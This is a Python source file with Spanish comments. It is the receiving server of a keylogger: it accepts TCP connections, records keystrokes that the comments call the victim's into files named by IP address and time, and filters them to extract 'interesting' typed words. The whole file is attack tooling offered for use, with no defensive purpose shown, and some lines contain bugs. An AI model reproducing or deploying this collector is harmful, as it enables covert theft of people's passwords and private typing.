#__LIBRARIES__#
import socket, sys, threading, os
from datetime import datetime

#__AUXILIARS__#
def analyze(ip, file, time):
    print('Analyzing information from %s...' %(ip))
    inter = 'DCIM/%s_interesting.txt' %(ip)
    irrelevant=[
        'Tab', 'Control_L', 'Control_R', 'Alt_L',
        'Menu', 'Insert', 'Home', 'End', 'Pause',
        'Page_Up', 'Next', 'Escape', 'Scroll_Lock',
    ]
    #analizamos el fichero para filtrar la palabras escritas
    info = list()
    with open(file, 'r') as fr:
        for line in fr.readlines():
            for word in line.split():
                if word not in irrelevant:
                    info.append(word)
        fr.close()
    # Pasemos la información importante a otro fichero
    n = 5
    m = len(info)
    tf = datetime.now().strftime('%X')
    with open(inter, 'a') as fa:
        fa.write('--Written between %s and %s--\n\n' %(time, tf))
        for i in range(0, m, 5):
            try:
                fa.write(' '.join(info[i:n]))
                n += i
            except IndexError:
                fa.write(' '.join(info[i:]))
                break
            fa.write('\n')
        else:
            if m % 5 != 0:
                fa.write(' '.join(info[n:]))
        fa.write('\n')
        fa.close()

def rec_info(addr, conn):
    print('Recording Start from IP %s!' %(addr[0]))
    keys = list() # buffer
    # Establecemos el no,bre del fichero (ip_fecha_hora)
    date = datetime.now().strftime('%x').replace('/', '-')
    time = datetime.now().strftime('%X')
    file_name = 'DCIM/%s_%s_%s.txt' %(addr[0], date, time)
    fw = open(file_name, 'w')
    while True:
        while len(keys) < 100:
            # recibimos y escribimos las pulsaciones de la victima en un txt
            key = str(conn.recv(1024)).split('\'')[1]
            print(len(keys), key)
            if key == 'space':
                key = ' '
            elif key == 'Return':
                key = '\n'
            elif key == 'Tecla num. [65027]':
                key = 'AltGr'
            elif key == '\\x08':
                key = '\\del'
            if not key == '\\x00':
                if len(key) == 1:
                    fw.write('%s' %(key))
                elif len(key) > 1 or key.startswith()('\\'):
                    fw.write(' %s ' %(key))
                keys.append(key)
        fw.close()
        # Analizamos el txt
        analyze_file = threading.Thread(target=analyze, args=(addr[0], file_name, time))
        analyze_file.start()
        # limpiamos el buffer y creamos el siguiente archivo
        keys=list()
        date = datetime.now().strftime('%x').replace('/', '-')
        time = datetime.now().strftime('%X')
        file_name = 'DCIM/%s_%s_%s.txt' %(addr[0], date, time)
        fw = open(file_name, 'w')

                
#__MAIN CODE__#
def server(ip, port, n_c=5):
    serv = socket.socket(
        socket.AF_INET, 
        socket.SOCK_STREAM
    )
    try:
        serv.bind((ip, port))
        serv.listen(n_c)
        serv.settimeout(300)
        while True:
            conn, addr = serv.accept()
            th = threading.Thread(target=rec_info, args=(addr, conn))
            th.start()
    except Exception:
        sys.exit()
    

#__Main Run__#
server(sys.argv[1], int(sys.argv[2]))


#__NOTAS__#
'''

'''

#__BIBLIOGRAPHY__#
'''

'''